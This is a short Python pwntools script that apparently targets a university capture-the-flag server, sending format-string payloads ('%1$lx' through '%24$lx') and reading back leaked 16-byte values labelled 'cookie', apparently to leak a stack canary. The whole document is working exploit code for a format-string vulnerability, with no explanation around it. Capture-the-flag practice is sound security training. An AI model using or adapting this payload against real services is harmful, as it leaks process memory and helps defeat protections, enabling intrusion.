from pwn import *

r = remote('ctf99.cs.ui.ac.id', 9136)
print(r.recvline())
print(r.recvline())
for i in range(1,25):
    payload = '%' + str(i)+ '$lx    '
    r.sendline(payload)
    print(r.recvuntil('testimony: '))
    cookie = r.recv(16)
    print(cookie)
    r.sendline('y')
